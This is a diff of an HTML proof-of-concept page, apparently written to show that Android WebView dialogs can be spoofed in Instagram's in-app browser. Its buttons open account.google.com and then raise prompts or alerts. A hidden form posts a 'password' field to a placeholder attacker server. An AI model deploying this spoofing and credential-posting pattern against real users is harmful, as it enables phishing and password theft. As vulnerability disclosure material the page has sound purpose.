@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android WebView Dialog Tests</title>
+    <title>PoC Instagram Android - WebView Dialog Test</title>
     <style>
         body {
             margin: 0;
@@ -36,21 +36,18 @@
     </style>
 </head>
 <body>
-    <h2>Android WebView Dialog Tests</h2>
+    <h2>Android WebView Dialog Test</h2>
     <button id="triggerBtn">Spoof Prompt</button>
     <button id="spoofAlertBtn">Spoof Alert</button>
     <button id="topPromptBtn">Top-level Prompt</button>
     <button id="topAlertBtn">Top-level Alert</button>
-    <button id="iframePromptBtn">Same-Origin iframe Prompt</button>
-    <button id="iframeAlertBtn">Same-Origin iframe Alert</button>
     <div id="status"></div>
-    <iframe id="sameOriginFrame" src="iframe-content.html" style="display:none;"></iframe>
     <form id="hiddenForm" class="hidden" method="POST" action="https://ARBITRARY_SERVER">
         <input type="text" id="passwordInput" name="password">
     </form>
 
     <script>
-        // Spoof Prompt Button
+        // Original Spoof Prompt Button
         document.getElementById('triggerBtn').onclick = () => {
             const w = window.open('https://account.google.com/');
             if (!w) {
@@ -102,7 +99,7 @@
             }, 2000);
         };
 
-        // Spoof Alert Button
+        // 1. Spoofing approach, triggers onJSAlert
         document.getElementById('spoofAlertBtn').onclick = () => {
             const w = window.open('https://account.google.com/');
             if (!w) {
@@ -121,7 +118,7 @@
             }, 2000);
         };
 
-        // Top-level Prompt
+        // 2. Standard top-level prompt
         document.getElementById('topPromptBtn').onclick = () => {
             const result = prompt("This is a standard top-level prompt. Enter something:");
             document.getElementById('status').innerHTML = result
@@ -129,32 +126,11 @@
                 : 'Prompt cancelled or empty.';
         };
 
-        // Top-level Alert
+        // 3. Standard top-level alert
         document.getElementById('topAlertBtn').onclick = () => {
             alert("This is a standard top-level alert!");
             document.getElementById('status').innerHTML = 'Alert was shown.';
         };
-
-        // Same-Origin iframe Prompt
-        document.getElementById('iframePromptBtn').onclick = () => {
-            document.getElementById('sameOriginFrame').style.display = 'block';
-            document.getElementById('sameOriginFrame').contentWindow.postMessage('triggerPrompt', '*');
-        };
-
-        // Same-Origin iframe Alert
-        document.getElementById('iframeAlertBtn').onclick = () => {
-            document.getElementById('sameOriginFrame').style.display = 'block';
-            document.getElementById('sameOriginFrame').contentWindow.postMessage('triggerAlert', '*');
-        };
-
-        window.addEventListener('message', function(event) {
-            if (event.data && event.data.type === 'promptResult') {
-                document.getElementById('status').innerHTML = 'Prompt result: ' + event.data.value;
-            }
-            if (event.data && event.data.type === 'alertResult') {
-                document.getElementById('status').innerHTML = event.data.value;
-            }
-        });
     </script>
 </body>
 </html>
